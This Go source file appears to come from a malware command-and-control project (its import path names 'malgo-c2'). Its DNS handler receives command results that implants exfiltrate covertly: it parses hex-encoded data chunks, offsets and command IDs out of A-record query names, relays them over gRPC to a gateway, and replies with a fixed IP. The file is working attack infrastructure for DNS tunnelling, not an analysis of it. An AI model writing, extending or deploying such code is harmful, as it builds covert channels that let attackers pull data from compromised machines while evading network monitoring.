package dnsproxy

import (
	"context"
	"encoding/hex"
	"fmt"
	"net"
	"strconv"
	"strings"

	gateway "github.com/VipWW/malgo-c2/services/common/service"
	"github.com/miekg/dns"
)

// handleA handles result retrieval queries. Queries look like:
// Either:
// - <char>.<result length>.<CommandID>.<domain>
// - <char>.<data chunk>.<offset>.<CommandID>.<domain>
//
// length and offset are in HEX. Chunk is in HEX. TODO: change to Base58
func (h *Handler) handleA(msg *dns.Msg, r *dns.Msg) error {
	dataFromMessage := h.removeDomain(r.Question[0].Name)
	if dataFromMessage == "" {
		return fmt.Errorf("invalid domain")
	}

	splitData := strings.Split(dataFromMessage, ".")

	switch len(splitData) {
	case 3:
		// <result length>.<CommandID>.<domain>
		length, err := strconv.Atoi(splitData[1])
		if err != nil {
			return err
		}
		_, err = h.grpcClient.ResultInfo(context.Background(), &gateway.ResultInfoRequest{
			CommandId: splitData[2],
			Length:    int64(length),
		})
		if err != nil {
			return err
		}
	case 4:
		// <data chunk>.<offset>.<CommandID>.<domain>
		data, err := hex.DecodeString(splitData[1])
		if err != nil {
			return err
		}
		offset, err := strconv.ParseInt(splitData[2], 16, 64)
		if err != nil {
			return err
		}
		_, err = h.grpcClient.ResultDetailsChunk(context.Background(), &gateway.ResultDetailsChunkRequest{
			CommandId: splitData[3],
			Offset:    offset,
			Data:      data,
		})
		if err != nil {
			return err
		}
	default:
		return fmt.Errorf("invalid data")
	}

	msg.Answer = append(msg.Answer, &dns.A{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    1,
		},
		A: net.ParseIP("183.216.123.191"),
	})

	return nil
}
